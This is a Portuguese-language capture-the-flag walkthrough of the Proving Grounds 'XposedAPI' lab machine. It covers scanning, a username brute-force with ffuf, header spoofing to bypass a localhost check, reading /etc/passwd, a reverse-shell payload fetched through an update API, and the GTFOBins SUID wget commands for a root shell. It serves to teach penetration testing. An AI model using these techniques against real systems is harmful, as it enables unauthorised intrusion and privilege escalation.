---
title: Proving Grounds - XposedAPI
author: mithr4nd1r
date: 2022-12-19 11:30:00 -0300
categories: [Walkthrough, Proving Grounds]
tags: [writeup, walkthrough, xposedapi, proving, grounds, PG, tutorial, hacking, pentest, ctf, capture, flag, proof, linux, medium, médio]
mermaid: true
image: "https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/api.jpg"
pin: true
---

Dificuldade | Opinião | 📅 Início | 📅 Conclusão
:--:|:--:|:--:|:--:
![](/assets/img/nivel/button_medio.png) | ![](/assets/img/nivel/button_medio.png) | 14 de Dezembro de 2022 | 19 de Dezembro de 2022

## 1. Escaneamento

```bash
Nmap scan report for 192.168.160.134
Host is up (0.21s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
13337/tcp open  http    Gunicorn 20.0.4
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn/20.0.4
|_http-title: Remote Software Management API
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/14%OT=22%CT=1%CU=33249%PV=Y%DS=2%DC=T%G=Y%TM=6399E8
OS:E2%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%II=I)SEQ(SP=108%G
OS:CD=1%ISR=109%TI=Z%TS=9)SEQ(SP=108%GCD=1%ISR=109%TI=Z%II=I%TS=A)OPS(O1=M5
OS:4EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O
OS:6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=A
OS:R%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## 2. Enumeração

### Remote Software Management (13337)

Ao entrar na página web, vemos que a aplicação é um tipo de API e ja nos é exposto algumas rotas

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed.png)

> /version
{: .prompt-info }

A rota `version` apenas nos retorna a versão `1.0.0b` e provavelmente um hash md5 em sequência `8f887f33975ead915f336f57f0657180`

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed1.png)

> /logs
{: .prompt-info }

A rota logs mostra que nosso hpst não tem acesso ao logs, provavelmente por ser acessível somente localmente.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed2.png)

Seguindo a descrição da rota update, deve-se enviar um post com user e url de um arquivo elf, para ser baixado e executado. Obviamente, aqui é o ponto de entrada, porém falta o nome de usuário.

```html
/update

Methods: POST

Updates the app from ELF file. Content-Type: application/json {"user":"<user requesting the update>", "url":"<url of the update to download>"}
```

> /update
{: .prompt-info }

Como forma de descobrir o usuário, meu primeiro pensamento foi em tentar um bruteforce, então utilizando a ferramenta ffuf, tentei encontrar um usuário cuja resposta da página não retornasse `username invalid` porém não obtive sucesso…

- Comando: `ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u [http://192.168.117.134:13337/update](http://192.168.117.134:13337/update) -X POST -H "Content-Type: application/json" -d '{"user": "FUZZ", "url": "[http://192.168.49.117](http://192.168.49.117/)"}' -fs 17 -x [http://127.0.0.1:8080](http://127.0.0.1:8080/)`

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed3.png)

> /restart
{: .prompt-info }

Ao enviar o restart, aparece um popup de confirmação do reinicio, porém ao clicar nele nada acontece aparentemente.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed4.png)

Ao interceptar com o Burp, verifica-se que o script envia um json de confirmação via POST pra causar o reinicio. Ao replicar isso, o serviço realmente reinicia:

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed5.png)

Retornando a rota logs, procurei uma forma de burlar a detecção de host do sistema. Encontrei algumas dicas no HackTricks, onde sugere-se o uso de alguns headers que podem causar esse bypass.

[Rate Limit Bypass](https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass)

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

Ao testar o segundo header, uma mensagem de erro diferente apareceu, sugerindo usar um parâmetro na url para ter acesso ao arquivo de log.

- Header: `X-Forwarded-For: 127.0.0.1`

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed6.png)

Como o nome do arquivo é passado, tentei passar direto o arquivo de usuários `/etc/passwd` e deu certo, nos retornando a lista de usuários, agora podemos tentar upar o arquivo `.elf` malicioso usando o usuário `clumsyadmin`.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed7.png)

Pra isso, subi um servidor http em python e enviei a requisição via BURP, retornando com sucesso a requisição para nós.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed8.png)

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed9.png)

## 3. Acesso Inicial - Exploração

Sendo assim, criei o binário com o msvenom, subi o servidor HTTP e abri uma porta de escuta para receber o shell

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed10.png)

Agora é necessário reiniciar o servidor e é só reenviar o post com a confirmação que descobrimos antes:

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed11.png)

E o shell veio:

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed12.png)

## 4. Pós Exploração

Como de praxe, upei o [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng) e fiz a varredura interna de vulnerabilidades.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed13.png)

A enumeração nos retornou o binário `wget` com execução de `SUID`.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed14.png)

## 5. Escalação de Privilégio

Então é só seguir os comandos descritos no [GTFOBins - Wget SUID](https://gtfobins.github.io/gtfobins/wget/#suid)

```
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
```

Por fim, root.

![Untitled](https://mithr4nd1r.github.io/assets/img/pg/2022-12-19-writup-xposedapi/exposed15.png)